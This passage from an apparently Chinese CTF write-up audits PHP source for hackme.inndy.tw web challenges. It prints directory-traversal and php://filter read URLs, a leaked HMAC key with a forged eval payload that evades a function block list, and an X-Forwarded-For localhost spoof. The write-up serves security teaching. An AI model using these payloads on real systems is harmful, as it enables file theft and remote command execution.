class=\"string\">'__GET'</span>][<span class=\"string\">\"action2\"</span>];</span><br><span class=\"line\">    <span class=\"keyword\">elseif</span> (<span class=\"keyword\">isset</span>($GLOBALS[<span class=\"string\">'__POST'</span>][<span class=\"string\">\"action2\"</span>])) $action2 = $GLOBALS[<span class=\"string\">'__POST'</span>][<span class=\"string\">\"action2\"</span>];</span><br><span class=\"line\">    <span class=\"keyword\">else</span> $action2 = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> ($action2) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"chpwd\"</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!$pwd) show_error($GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"accessfunc\"</span>]);</span><br><span class=\"line\">            changepwd($dir);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"adduser\"</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!$admin) show_error($GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"accessfunc\"</span>]);</span><br><span class=\"line\">            adduser($dir);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"edituser\"</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!$admin) show_error($GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"accessfunc\"</span>]);</span><br><span class=\"line\">            edituser($dir);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"rmuser\"</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!$admin) show_error($GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"accessfunc\"</span>]);</span><br><span class=\"line\">            removeuser($dir);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">default</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!$pwd &amp;&amp; !$admin) show_error($GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"accessfunc\"</span>]);</span><br><span class=\"line\">            admin($admin, $dir);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>主要的限制条件在于</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$pwd = (($GLOBALS[<span class=\"string\">\"permissions\"</span>] &amp; <span class=\"number\">2</span>) == <span class=\"number\">2</span>);</span><br><span class=\"line\">$admin = (($GLOBALS[<span class=\"string\">\"permissions\"</span>] &amp; <span class=\"number\">4</span>) == <span class=\"number\">4</span>);</span><br></pre></td></tr></table></figure>\n<p>我们跟进这个变量看一下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">activate_user</span><span class=\"params\">($user, $pass)</span> </span>&#123;</span><br><span class=\"line\">    $data = find_user($user, $pass);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($data == <span class=\"keyword\">NULL</span>) <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    $GLOBALS[<span class=\"string\">'__SESSION'</span>][<span class=\"string\">\"s_user\"</span>] = $data[<span class=\"number\">0</span>];</span><br><span class=\"line\">    $GLOBALS[<span class=\"string\">'__SESSION'</span>][<span class=\"string\">\"s_pass\"</span>] = $data[<span class=\"number\">1</span>];</span><br><span class=\"line\">    $GLOBALS[<span class=\"string\">\"home_dir\"</span>] = $data[<span class=\"number\">2</span>];</span><br><span class=\"line\">    $GLOBALS[<span class=\"string\">\"home_url\"</span>] = $data[<span class=\"number\">3</span>];</span><br><span class=\"line\">    $GLOBALS[<span class=\"string\">\"show_hidden\"</span>] = $data[<span class=\"number\">4</span>];</span><br><span class=\"line\">    $GLOBALS[<span class=\"string\">\"no_access\"</span>] = $data[<span class=\"number\">5</span>];</span><br><span class=\"line\">    $GLOBALS[<span class=\"string\">\"permissions\"</span>] = $data[<span class=\"number\">6</span>];</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>再定位到find_user()</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> &amp;<span class=\"title\">find_user</span><span class=\"params\">($user, $pass)</span> </span>&#123;</span><br><span class=\"line\">    $cnt = count($GLOBALS[<span class=\"string\">\"users\"</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ($i = <span class=\"number\">0</span>;$i &lt; $cnt;++$i) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($user == $GLOBALS[<span class=\"string\">\"users\"</span>][$i][<span class=\"number\">0</span>]) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ($pass == <span class=\"keyword\">NULL</span> || ($pass == $GLOBALS[<span class=\"string\">\"users\"</span>][$i][<span class=\"number\">1</span>] &amp;&amp; $GLOBALS[<span class=\"string\">\"users\"</span>][$i][<span class=\"number\">7</span>])) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> $GLOBALS[<span class=\"string\">\"users\"</span>][$i];</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">NULL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>可以看到data来自于全局变量users中，那么我们在追踪到.htusers.php中的users变量    </p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$GLOBALS[<span class=\"string\">\"users\"</span>] = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">    <span class=\"keyword\">array</span>(<span class=\"string\">\"guest\"</span>, <span class=\"string\">\"084e0343a0486ff05530df6c705c8bb4\"</span>, <span class=\"string\">\"./data/guest\"</span>, <span class=\"string\">\"https://game1.security.ntu.st/data/guest\"</span>, <span class=\"number\">0</span>, <span class=\"string\">\"^.ht\"</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>),</span><br><span class=\"line\">);</span><br></pre></td></tr></table></figure>\n<p>但是源代码泄露只给出guest的信息，而没有admin的信息，所以我们可以考虑尝试读取该PHP文件的内容，所以我们可以在代码中查找文件读取相关的的函数</p>\n<p>在fun_down.php文件中可以找到一个readfile()函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">require_once</span> (<span class=\"string\">'core/secure.php'</span>);</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">download_item</span><span class=\"params\">($dir, $item)</span> </span>&#123;</span><br><span class=\"line\">    $item = basename($item);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (($GLOBALS[<span class=\"string\">\"permissions\"</span>] &amp; <span class=\"number\">01</span>) != <span class=\"number\">01</span>) show_error($GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"accessfunc\"</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!get_is_file($dir, $item)) show_error($item . <span class=\"string\">\": \"</span> . $GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"fileexist\"</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!get_show_item($dir, $item)) show_error($item . <span class=\"string\">\": \"</span> . $GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"accessfile\"</span>]);</span><br><span class=\"line\">    $abs_item = get_abs_item($dir, $item);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!file_in_web($abs_item) || stristr($abs_item, <span class=\"string\">'.php'</span>) || stristr($abs_item, <span class=\"string\">'config'</span>)) show_error($item . <span class=\"string\">\": \"</span> . $GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"accessfile\"</span>]);</span><br><span class=\"line\">    $browser = id_browser();</span><br><span class=\"line\">    header(<span class=\"string\">'Content-Type: '</span> . (($browser == <span class=\"string\">'IE'</span> || $browser == <span class=\"string\">'OPERA'</span>) ? <span class=\"string\">'application/octetstream'</span> : <span class=\"string\">'application/octet-stream'</span>));</span><br><span class=\"line\">    header(<span class=\"string\">'Expires: '</span> . gmdate(<span class=\"string\">'D, d M Y H:i:s'</span>) . <span class=\"string\">' GMT'</span>);</span><br><span class=\"line\">    header(<span class=\"string\">'Content-Transfer-Encoding: binary'</span>);</span><br><span class=\"line\">    header(<span class=\"string\">'Content-Length: '</span> . filesize($abs_item));</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($browser == <span class=\"string\">'IE'</span>) &#123;</span><br><span class=\"line\">        header(<span class=\"string\">'Content-Disposition: attachment; filename=\"'</span> . $item . <span class=\"string\">'\"'</span>);</span><br><span class=\"line\">        header(<span class=\"string\">'Cache-Control: must-revalidate, post-check=0, pre-check=0'</span>);</span><br><span class=\"line\">        header(<span class=\"string\">'Pragma: public'</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        header(<span class=\"string\">'Content-Disposition: attachment; filename=\"'</span> . $item . <span class=\"string\">'\"'</span>);</span><br><span class=\"line\">        header(<span class=\"string\">'Cache-Control: no-cache, must-revalidate'</span>);</span><br><span class=\"line\">        header(<span class=\"string\">'Pragma: no-cache'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @readfile($abs_item);</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>题目过滤部分如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (($GLOBALS[<span class=\"string\">\"permissions\"</span>] &amp; <span class=\"number\">01</span>) != <span class=\"number\">01</span>) show_error($GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"accessfunc\"</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!get_is_file($dir, $item)) show_error($item . <span class=\"string\">\": \"</span> . $GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"fileexist\"</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!get_show_item($dir, $item)) show_error($item . <span class=\"string\">\": \"</span> . $GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"accessfile\"</span>]);</span><br><span class=\"line\">    $abs_item = get_abs_item($dir, $item);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!file_in_web($abs_item) || stristr($abs_item, <span class=\"string\">'.php'</span>) || stristr($abs_item, <span class=\"string\">'config'</span>)) show_error($item . <span class=\"string\">\": \"</span> . $GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"accessfile\"</span>]);</span><br></pre></td></tr></table></figure>\n<p>我们要读取的是 <code>.config/.htusers.php</code> ，但是在题目的 <code>stristr($abs_item, &#39;.php&#39;) || stristr($abs_item, &#39;config&#39;)</code> 过滤了config和php两个字段，显然无法读取，只得在看看其他的函数，在fun_edit.php中</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">edit_file</span><span class=\"params\">($dir, $item)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (($GLOBALS[<span class=\"string\">\"permissions\"</span>] &amp; <span class=\"number\">01</span>) != <span class=\"number\">01</span>) show_error($GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"accessfunc\"</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!get_is_file($dir, $item)) show_error($item . <span class=\"string\">\": \"</span> . $GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"fileexist\"</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!get_show_item($dir, $item)) show_error($item . <span class=\"string\">\": \"</span> . $GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"accessfile\"</span>]);</span><br><span class=\"line\">    $fname = get_abs_item($dir, $item);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!file_in_web($fname)) show_error($GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"accessfile\"</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($GLOBALS[<span class=\"string\">'__POST'</span>][<span class=\"string\">\"dosave\"</span>]) &amp;&amp; $GLOBALS[<span class=\"string\">'__POST'</span>][<span class=\"string\">\"dosave\"</span>] == <span class=\"string\">\"yes\"</span>) &#123;</span><br><span class=\"line\">        $item = basename(stripslashes($GLOBALS[<span class=\"string\">'__POST'</span>][<span class=\"string\">\"fname\"</span>]));</span><br><span class=\"line\">        $fname2 = get_abs_item($dir, $item);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>($item) || $item == <span class=\"string\">\"\"</span>) show_error($GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"miscnoname\"</span>]);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($fname != $fname2 &amp;&amp; @file_exists($fname2)) show_error($item . <span class=\"string\">\": \"</span> . $GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"itemdoesexist\"</span>]);</span><br><span class=\"line\">        savefile($dir, $fname2);</span><br><span class=\"line\">        $fname = $fname2;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $fp = @fopen($fname, <span class=\"string\">\"r\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($fp === <span class=\"keyword\">false</span>) show_error($item . <span class=\"string\">\": \"</span> . $GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"openfile\"</span>]);</span><br><span class=\"line\">    $s_item = get_rel_item($dir, $item);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (strlen($s_item) &gt; <span class=\"number\">50</span>) $s_item = <span class=\"string\">\"...\"</span> . substr($s_item, <span class=\"number\">-47</span>);</span><br><span class=\"line\">    show_header($GLOBALS[<span class=\"string\">\"messages\"</span>][<span class=\"string\">\"actedit\"</span>] . <span class=\"string\">\": /\"</span> . $s_item);</span><br></pre></td></tr></table></figure>\n<p>函数中有三条过滤</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (($GLOBALS[<span class=\"string\">\"permissions\"</span>] &amp; <span class=\"number\">01</span>) != <span class=\"number\">01</span>) show_error($GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"accessfunc\"</span>]);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (!get_is_file($dir, $item)) show_error($item . <span class=\"string\">\": \"</span> . $GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"fileexist\"</span>]);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (!get_show_item($dir, $item)) show_error($item . <span class=\"string\">\": \"</span> . $GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"accessfile\"</span>]);</span><br></pre></td></tr></table></figure>\n<p>第一条权限验证guest权限显然是满足的，第二条判断文件是否存在，不需要考虑，第三个我们跟进函数看一下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_show_item</span><span class=\"params\">($dir, $item)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($item == <span class=\"string\">\".\"</span> || $item == <span class=\"string\">\"..\"</span>) <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($_COOKIE[<span class=\"string\">'help'</span>] == <span class=\"string\">'me'</span>) &#123;</span><br><span class=\"line\">        $_COOKIE[<span class=\"string\">'help'</span>] = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        setcookie(<span class=\"string\">'help'</span>, <span class=\"string\">''</span>, time() - <span class=\"number\">9999999999</span>);</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;script&gt;alert(\"Very good. You know how to create cookie. How about tamper a cookie?\")&lt;/script&gt;'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">empty</span>($_COOKIE[<span class=\"string\">'show_hidden'</span>])) &#123;</span><br><span class=\"line\">        setcookie(<span class=\"string\">'show_hidden'</span>, <span class=\"string\">'no'</span>, time() + <span class=\"number\">3600</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (substr($item, <span class=\"number\">0</span>, <span class=\"number\">1</span>) == <span class=\"string\">\".\"</span> &amp;&amp; $GLOBALS[<span class=\"string\">\"show_hidden\"</span>] == <span class=\"keyword\">false</span> &amp;&amp; $_COOKIE[<span class=\"string\">'show_hidden'</span>] != <span class=\"string\">'yes'</span>) <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($GLOBALS[<span class=\"string\">\"no_access\"</span>] != <span class=\"string\">\"\"</span> &amp;&amp; @eregi($GLOBALS[<span class=\"string\">\"no_access\"</span>], $item)) <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($GLOBALS[<span class=\"string\">\"show_hidden\"</span>] == <span class=\"keyword\">false</span>) &#123;</span><br><span class=\"line\">        $dirs = explode(<span class=\"string\">\"/\"</span>, $dir);</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> ($dirs <span class=\"keyword\">as</span> $i) <span class=\"keyword\">if</span> (substr($i, <span class=\"number\">0</span>, <span class=\"number\">1</span>) == <span class=\"string\">\".\"</span>) <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>题目仅仅对$item进行了简单的过滤， <code>if ($item == &quot;.&quot; || $item == &quot;..&quot;) return false;</code> ，那么我们可以考虑用目录穿越 <code>../../</code> 绕过</p>\n<p>那么至此我们可以在网站中找到edit相关的函数，发起请求（注意cookie中show_hidden对应的值要改为yes）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;dafuq-manager.hackme.inndy.tw&#x2F;index.php?action&#x3D;edit&amp;item&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;webhdisk&#x2F;.config&#x2F;.htusers.php&amp;order&#x3D;name&amp;srt&#x3D;yes&amp;lang&#x3D;en</span><br></pre></td></tr></table></figure>\n<p>于是可以读到目标文件</p>\n<p><img src=\"/2018/08/28/hackme/3.png\" alt=\".htusers.php\"></p>\n<p>然后用admin用户登录即可，注意密码要进行md5解密即可，密码为 <code>how do you turn this on</code> ，登录即可读取flag</p>\n<h1 id=\"dafuq-manager-3\"><a href=\"#dafuq-manager-3\" class=\"headerlink\" title=\"dafuq-manager 3\"></a>dafuq-manager 3</h1><p>题目给出了信息</p>\n<blockquote>\n<p>For flag3, you need a shell to get that. see $WEBROOT/flag3!</p>\n</blockquote>\n<p>这关我们需要getsheel读取文件，那么我们在源码中寻找可以执行系统命令的语句，在文件中尝试搜索关键词 <code>eval</code> ，在fun_debug.php中发现存在该函数，跟进一下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">do_debug</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    assert(strlen($GLOBALS[<span class=\"string\">'secret_key'</span>]) &gt; <span class=\"number\">40</span>);</span><br><span class=\"line\">    $dir = $GLOBALS[<span class=\"string\">'__GET'</span>][<span class=\"string\">'dir'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (strcmp($dir, <span class=\"string\">\"magically\"</span>) || strcmp($dir, <span class=\"string\">\"hacker\"</span>) || strcmp($dir, <span class=\"string\">\"admin\"</span>)) &#123;</span><br><span class=\"line\">        show_error(<span class=\"string\">'You are not hacky enough :('</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">list</span>($cmd, $hmac) = explode(<span class=\"string\">'.'</span>, $GLOBALS[<span class=\"string\">'__GET'</span>][<span class=\"string\">'command'</span>], <span class=\"number\">2</span>);</span><br><span class=\"line\">    $cmd = base64_decode($cmd);</span><br><span class=\"line\">    $bad_things = <span class=\"keyword\">array</span>(<span class=\"string\">'system'</span>, <span class=\"string\">'exec'</span>, <span class=\"string\">'popen'</span>, <span class=\"string\">'pcntl_exec'</span>, <span class=\"string\">'proc_open'</span>, <span class=\"string\">'passthru'</span>, <span class=\"string\">'`'</span>, <span class=\"string\">'eval'</span>, <span class=\"string\">'assert'</span>, <span class=\"string\">'preg_replace'</span>, <span class=\"string\">'create_function'</span>, <span class=\"string\">'include'</span>, <span class=\"string\">'require'</span>, <span class=\"string\">'curl'</span>,);</span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> ($bad_things <span class=\"keyword\">as</span> $bad) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (stristr($cmd, $bad)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">'2bad'</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (hash_equals(hash_hmac(<span class=\"string\">'sha256'</span>, $cmd, $GLOBALS[<span class=\"string\">\"secret_key\"</span>]), $hmac)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"keyword\">eval</span>($cmd));</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        show_error(<span class=\"string\">'What does the fox say?'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>对于dir的过滤，我们可以利用strcmp的数组绕过特性来绕过，题目还过滤了一些系统函数，我们可以考虑通过base64编码绕过，而对于$GLOBALS[‘__GET’][‘command’]变量的生成，题目也给出了生成函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">make_command</span><span class=\"params\">($cmd)</span> </span>&#123;</span><br><span class=\"line\">    $hmac = hash_hmac(<span class=\"string\">'sha256'</span>, $cmd, $GLOBALS[<span class=\"string\">\"secret_key\"</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> sprintf(<span class=\"string\">'%s.%s'</span>, base64_encode($cmd), $hmac);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>所以我们可以自己生成command</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">make_command</span><span class=\"params\">($cmd)</span> </span>&#123;</span><br><span class=\"line\">    $hmac = hash_hmac(<span class=\"string\">'sha256'</span>, $cmd, <span class=\"string\">\"KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> sprintf(<span class=\"string\">'%s.%s'</span>, base64_encode($cmd), $hmac);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var_dump(make_command(<span class=\"string\">'$a=\\'sys\\';$b=\\'tem\\';$c=$a.$b;$c(base64_decode(\\'Li9mbGFnMy9tZW93IGZsYWczL2ZsYWcz\\'));'</span>));</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>注意本题不能直接读取flag，要通过运行目录下的一个c文件来间接读取flag，最终payload如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;dafuq-manager.hackme.inndy.tw&#x2F;index.php?action&#x3D;debug&amp;dir[]&#x3D;admin&amp;command&#x3D;JGE9J3N5cyc7JGI9J3RlbSc7JGM9JGEuJGI7JGMoYmFzZTY0X2RlY29kZSgnTGk5bWJHRm5NeTl0Wlc5M0lHWnNZV2N6TDJac1lXY3onKSk7.001e9b2112bdf0443a0eaf4a489f477d1cf525cf58f05286606007046856460b&amp;order&#x3D;name&amp;srt&#x3D;yes&amp;lang&#x3D;en</span><br></pre></td></tr></table></figure>\n<p>做完后感觉自己好菜呀，这代码审计的我晕头转向，233333…</p>\n<h1 id=\"wordpress-1\"><a href=\"#wordpress-1\" class=\"headerlink\" title=\"wordpress 1\"></a>wordpress 1</h1><p>WordPress代码审计，在backup file中可以下载到源码，打开源码，随便翻一下，在 <code>wp-content/plugins/core.php</code> 中发现了一段代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">print_f14g</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t$h = <span class=\"string\">'m'</span>.sprintf(<span class=\"string\">'%s%d'</span>,<span class=\"string\">'d'</span>,<span class=\"number\">-4</span>+<span class=\"number\">9e0</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>($h($_GET[<span class=\"string\">'passw0rd'</span>]) === <span class=\"string\">'5ada11fd9c69c78ea65c832dd7f9bbde'</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(wp_get_user_ip() === <span class=\"string\">'127.0.0.1'</span>) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">eval</span>(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $h($_GET[<span class=\"string\">'passw0rd'</span>].AUTH_KEY), base64_decode(<span class=\"string\">'zEFnGVANrtEUTMLVyBusu4pqpHjqhn3X+cCtepGKg89VgIi6KugA+hITeeKIpnQIQM8UZbUkRpuCe/d8Rf5HFQJSawpeHoUg5NtcGam0eeTw+1bnFPT3dcPNB8IekPBDyXTyV44s3yaYMUAXZWthWHEVDFfKSjfTpPmQkB8fp6Go/qytRtiP3LyYmofhOOOV8APh0Pv34VPjCtxcJUpqIw=='</span>), MCRYPT_MODE_CBC, $h($_GET[<span class=\"string\">'passw0rd'</span>].AUTH_SALT)));</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">die</span>(<span class=\"string\">'&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Sorry, Only admin from localhost can get flag'</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>我们把代码中的md5解密一下发现是 <code>cat flag</code>，而题目要求从本地访问，我们可以通过修改x-forwarded-for字段实现，所以修改请求头之后，在访问</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;wp.hackme.inndy.tw&#x2F;?passw0rd&#x3D;cat%20flag</span><br></pre></td></tr></table></figure>\n<p>查看元素即可找到flag</p>\n<h1 id=\"wordpress-2\"><a href=\"#wordpress-2\" class=\"headerlink\" title=\"wordpress 2\"></a>wordpress 2</h1><p>随便翻一下博客上的文章，发现有2013年10月发表了一篇文章，题目为flag2，但是需要密码，审计代码发现在content-search.php中有如下语句</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;!-- debug:<span class=\"meta\">&lt;?php</span> var_dump($wp_query-&gt;post-&gt;&#123;<span class=\"string\">'post_'</span>.(string)($_GET[<span class=\"string\">'debug'</span>]?:<span class=\"string\">'type'</span>)&#125;); <span class=\"meta\">?&gt;</span> --&gt;</span><br></pre></td></tr></table></figure>\n<p>看到query，应该是在搜索页面，所以我们提交的payload应该为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;wp.hackme.inndy.tw&#x2F;archives&#x2F;date&#x2F;2013&#x2F;10?s&#x3D;&amp;debug&#x3D;content</span><br></pre></td></tr></table></figure>\n<h1 id=\"command-executor\"><a href=\"#command-executor\" class=\"headerlink\" title=\"command-executor\"></a>command-executor</h1><p>随便点击，发现有func参数存在文件读取漏洞，利用filter协议可以读取文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;command-executor.hackme.inndy.tw&#x2F;index.php?func&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index</span><br></pre></td></tr></table></figure>\n<p>base64解码一下得到源代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$pages = [</span><br><span class=\"line\">    [<span class=\"string\">'man'</span>, <span class=\"string\">'Man'</span>],</span><br><span 